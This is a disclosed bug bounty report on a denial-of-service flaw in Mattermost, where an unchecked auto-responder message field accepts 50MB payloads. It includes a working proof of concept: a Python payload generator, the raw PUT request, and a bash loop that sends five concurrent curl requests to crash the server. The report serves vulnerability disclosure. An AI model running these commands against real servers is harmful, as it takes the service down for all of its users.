# DoS via Automatic Response Message

## Report Details
- **Report ID**: 1680241
- **URL**: https://hackerone.com/reports/1680241
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-08-25T14:48:33.481Z
- **Disclosed**: 2022-11-23T14:55:25.361Z

## Reporter
- **Username**: vultza
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mattermost

## Vulnerability Information
## Summary:
A user can enable and modify its automatic response message, that is automatically sent when the user has the "Out of Office" status. This response message doesn't have any size check or validation, which allows an attacker to set an almost unlimited number of characters as the response value.

In a production environment is possible to set up to 50MB of data, due to the default nginx configuration, as the response message value, which causes the server to stop responding to user requests and ultimately leads to the server crash due to the incapacity to update and handle such a large amount of data.

## Steps To Reproduce:

1. Login as a normal user in the platform.
2. Grab the `MMAUTHTOKEN` authentication token.
3. Generate the payload string, which consists in 50000000(50MB) characters. Python can be used for this:
   ```bash
   python2.7 -c "print 'A' * 50000000"
   ```
4. Send the following `PUT` request to the `/api/v4/users/me/patch` API Endpoint:
   ```
   PUT http://localhost:8065/api/v4/users/me/patch
   Content-Type: application/json
   X-CSRF-TOKEN: <csrf-token>
   Cookie: MMAUTHTOKEN=<token>
   
   {"notify_props":{"auto_responder_active":"true","auto_responder_message":"<payload>"}}
   ```
5. For a greater impact, the above request should be sent 5 times at the same time. After the requests are sent, the server will start to consume an abnormal quantity of computing resources, and crashes after some seconds.
6. The application becomes unavailable for all its users.

The steps 3-6 can be automated using the following 2 commands:

```bash
$ python2.7 -c "print '{\"notify_props\":{\"auto_responder_active\":\"true\",\"auto_responder_message\":\"' + 'A' * 50000000 + '\"}}'" > payload

$ for ((i = 0; i < 5; i++)); do curl -X PUT "http://<domain>/api/v4/users/me/patch" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<token>" -H "X-CSRF-TOKEN: <csrf-token>" &; done;
```
## Supporting Material/References:

  *  PoC Video 
{F1883883}

## Impact

A user can cause a full denial of service attack in the application server, making the application server unavailable to all its users.

## Attachments
- dos-response-message.mp4
